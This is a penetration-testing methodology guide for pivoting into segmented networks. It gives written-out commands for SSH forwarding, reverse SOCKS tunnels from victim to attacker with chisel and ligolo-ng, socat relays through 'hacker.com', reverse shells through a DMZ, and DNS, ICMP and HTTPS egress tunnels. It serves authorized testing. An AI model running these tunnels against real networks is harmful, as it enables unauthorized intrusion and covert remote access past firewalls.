---
name: performing-network-pivoting-and-tunneling
description: Pivoting into segmented internal networks during authorized engagements via SSH local/remote/dynamic
  forwarding, SOCKS proxies with proxychains, and modern tunneling tools (chisel, ligolo-ng, socat, sshuttle) plus
  egress-restricted options (DNS/ICMP tunnels, cloudflared, ngrok, frp) to reach otherwise unreachable hosts.
domain: cybersecurity
subdomain: linux-hardening
tags:
- penetration-testing
- linux
- pivoting
- tunneling
- port-forwarding
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Performing Network Pivoting and Tunneling

## When to Use

- After compromising a host that has access to a network segment you cannot reach directly
- When the target sits behind a DMZ, NAT, or firewall and you need to relay traffic through a foothold
- When scanning or attacking internal services (RDP, WinRM, SMB, databases) from your attack box
- When egress is restricted and you must tunnel over HTTPS, DNS, or ICMP
- When establishing reverse access from an internal host out to your infrastructure

## Critical: Techniques Most Often Missed

Pivoting fails when testers forget that SOCKS-tunneled scans must be TCP-connect, or pick the wrong forward direction. Get the fundamentals exact.

- **SOCKS scans need `-sT -Pn`.** ICMP and SYN scans cannot traverse a SOCKS proxy.
  - How to CONFIRM: `proxychains nmap -n -Pn -sT -p445,3389 10.10.17.25` returns open ports; the same scan without `-sT` hangs/returns nothing.
- **Dynamic SSH forwarding (`-D`) = full SOCKS pivot.** A single `-D` gives access to the whole reachable subnet, not just one port.
  - How to CONFIRM: `ssh -f -N -D 1080 user@foothold`, set `socks4 127.0.0.1 1080` in proxychains, then `proxychains curl http://internal` works.
- **Remote forward (`-R`) for reverse access through a DMZ.** Requires `GatewayPorts yes` to bind non-loopback.
  - How to CONFIRM: `ssh -R 0.0.0.0:443:0.0.0.0:7000 user@dmzhost`; a reverse shell sent to dmz:443 lands on your `localhost:7000`.
- **ligolo-ng / chisel give a routed tunnel, not just one port.** A `ligolo` tun interface + route reaches the whole agent subnet.
  - How to CONFIRM: after `tunnel_start` + `interface_add_route`, `nmap`/`curl` to the agent's subnet works with no proxychains.
- **Version mismatch breaks chisel/ligolo silently.** Client and server (agent and proxy) must be the same version.
  - How to CONFIRM: identical `--version` on both ends; the tunnel establishes and `listener_list`/proxychains traffic flows.
- **Egress-only-443 environments still tunnel.** cloudflared/ngrok/frp ride outbound HTTPS; DNS/ICMP tunnels when only those leak.
  - How to CONFIRM: `cloudflared tunnel --url ...` yields a reachable `trycloudflare.com` URL despite blocked inbound.

## Workflow

### Step 1: Map Reachability from the Foothold

```bash
ip route ; ip addr ; cat /etc/hosts          # what subnets does the foothold see
for i in $(seq 1 254); do (ping -c1 -W1 10.0.5.$i >/dev/null && echo "10.0.5.$i up") & done; wait
# Or check listening internal services
ss -tlnp ; ss -tnp | grep ESTAB
```

### Step 2: SSH Port Forwarding (the core primitives)

```bash
# LOCAL forward: your_port -> foothold -> third_box:port
ssh -i key user@foothold -L 631:<victim_ip>:631 -N -f

# DYNAMIC forward: SOCKS proxy through the foothold (whole subnet)
ssh -f -N -D 1080 user@foothold
echo 'socks4 127.0.0.1 1080' >> /etc/proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.0.5.25

# REMOTE forward: open a port on the foothold/DMZ back to a local service
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@foothold     # needs GatewayPorts yes
```

### Step 3: Tunnel a Whole Subnet with sshuttle

```bash
pip install sshuttle
sshuttle -r user@foothold 10.10.10.0/24
sshuttle -D -r user@foothold 0/0 --ssh-cmd 'ssh -i ./id_rsa'   # daemon + key
```

### Step 4: chisel (reverse SOCKS when SSH isn't available)

```bash
# Attacker (server, reverse mode)
./chisel server -p 8080 --reverse
# Victim (client) -> exposes a SOCKS proxy on the attacker's :1080
./chisel client 10.10.14.3:8080 R:socks
proxychains -q nmap -sT -Pn -p3389 10.0.5.50

# Single-port reverse forward instead of SOCKS
./chisel client 10.10.14.20:8080 R:4505:127.0.0.1:4505
```

### Step 5: ligolo-ng (routed tun interface — fast, no proxychains)

```bash
# Attacker (proxy)
sudo ./proxy -selfcert
interface_create --name "ligolo"
certificate_fingerprint
# Victim (agent)
./agent -connect <attacker_ip>:11601 -accept-fingerprint <fingerprint>
# Attacker: select session, then route the agent's subnet through the tun
session            # pick the agent
tunnel_start --tun "ligolo"
interface_add_route --name "ligolo" --route 10.0.5.0/24
# Now scan/connect directly: nmap -sT 10.0.5.0/24
# Reverse listener on the agent forwarding back to the proxy:
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
```

### Step 6: socat Relays and TCP Forwarders

```bash
# Simple TCP forwarder on the pivot: listen 1234 -> redirect_ip:rport
socat TCP4-LISTEN:1234,fork TCP4:<redirect_ip>:<rport> &
# socat as a SOCKS-aware forwarder
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
# Encrypted relay through a non-auth proxy (egress)
socat OPENSSL,verify=1,cert=client.pem,cafile=server.crt|PROXY:hacker.com:443|TCP:proxy.lan:8080
```

### Step 7: Egress-Restricted Tunnels (only 443 / DNS / ICMP out)

```bash
# cloudflared — outbound 443 only, no inbound rules needed
cloudflared tunnel --url http://localhost:8080          # -> https://<rand>.trycloudflare.com
# ngrok — expose a TCP listener to the Internet
./ngrok tcp 4444                                        # -> 0.tcp.ngrok.io:12345
# frp — reverse proxy / SSH tunnel gateway (living off the land)
./frpc -c frpc.toml                                     # exposes local 3389 on frps:5000
# DNS tunnel (root both ends) when only DNS resolves out
iodined -f -c -P pass 1.1.1.1 tunneldomain.com          # server
iodine  -f -P pass tunneldomain.com -r                  # client; then ssh -D 1080 1.1.1.2
# ICMP tunnel when only ping leaves
sudo ptunnel-ng -p <server_ip> -l 2222 -r <dest_ip> -R 22 ; ssh -p 2222 user@127.0.0.1
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Local forward (-L)** | Binds a port on your box that tunnels to a remote host:port via the foothold |
| **Remote forward (-R)** | Opens a port on the foothold/DMZ that tunnels back to a service on your side |
| **Dynamic forward (-D)** | Turns SSH into a SOCKS proxy reaching any host the foothold can see |
| **SOCKS + proxychains** | Wrap arbitrary TCP tools to route through a proxy; requires `-sT -Pn` for nmap |
| **Routed tun pivot** | ligolo-ng/sshuttle create an interface+route so tools talk to the subnet directly |
| **Reverse tunnel** | Connection initiated from the internal/victim side outbound (defeats inbound ACLs) |
| **Egress tunneling** | DNS/ICMP/HTTPS channels (iodine, ptunnel-ng, cloudflared) for locked-down networks |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **ssh** | `-L`/`-R`/`-D` forwarding; the universal pivot primitive |
| **proxychains** | Force arbitrary TCP tools through a SOCKS/HTTP proxy |
| **sshuttle** | Transparent subnet-level VPN-like tunnel over SSH |
| **chisel** | Fast TCP/SOCKS tunnel over HTTP; reverse mode for NAT'd victims |
| **ligolo-ng** | Routed tun-interface pivoting (agent/proxy), no proxychains needed |
| **socat** | Flexible TCP/TLS/SOCKS relays and forwarders |
| **cloudflared / ngrok / frp** | Outbound-only tunnels that bypass ingress firewalls |
| **iodine / ptunnel-ng / dnscat2** | DNS and ICMP tunnels for egress-restricted environments |

## Common Scenarios

### Scenario 1: SOCKS pivot to scan an internal subnet
A web server foothold reaches the 10.0.5.0/24 management VLAN. `ssh -D 1080` + `proxychains nmap -sT -Pn` enumerates RDP/WinRM hosts unreachable from the attack box.

### Scenario 2: Reverse shell out of a DMZ
An internal host can only talk to the DMZ box. `ssh -R 0.0.0.0:443:0.0.0.0:7000` (GatewayPorts yes) lets the internal host send a reverse shell to dmz:443 which surfaces on the tester's localhost:7000.

### Scenario 3: ligolo routed tunnel for full access
A chisel SOCKS proxy is too slow for SMB. ligolo-ng's tun interface plus a subnet route lets `crackmapexec` and `evil-winrm` talk to the subnet natively.

### Scenario 4: Egress-only-443 environment
Inbound is fully blocked and only outbound 443 works. `cloudflared tunnel --url socks5://localhost:1080 --socks5` provides a working SOCKS path off the host.

## Output Format

```
## Network Pivoting Finding

**Activity**: Internal Network Pivoting
**Severity**: Informational / Methodology
**Foothold**: web01 (10.0.1.20) with route to 10.0.5.0/24 (management VLAN)

### Pivot Established
ssh -f -N -D 1080 svc@10.0.1.20
proxychains.conf: socks4 127.0.0.1 1080

### Reachable Internal Hosts (via pivot)
| Host | Port | Service |
|------|------|---------|
| 10.0.5.10 | 3389 | RDP (DC) |
| 10.0.5.25 | 5985 | WinRM |
| 10.0.5.40 | 1433 | MSSQL |

### Impact
Segmentation between the web tier and the management VLAN is not enforced
at the host level; a single web compromise exposes domain infrastructure.

### Recommendation
1. Enforce egress filtering and host-based firewalls on the web tier
2. Restrict management VLAN access to jump hosts with MFA and logging
3. Patch SSH to >= 9.6 (Terrapin CVE-2023-48795) before relying on tunnels
4. Monitor for SOCKS proxies, chisel/ligolo binaries, and anomalous DNS/ICMP volume
```
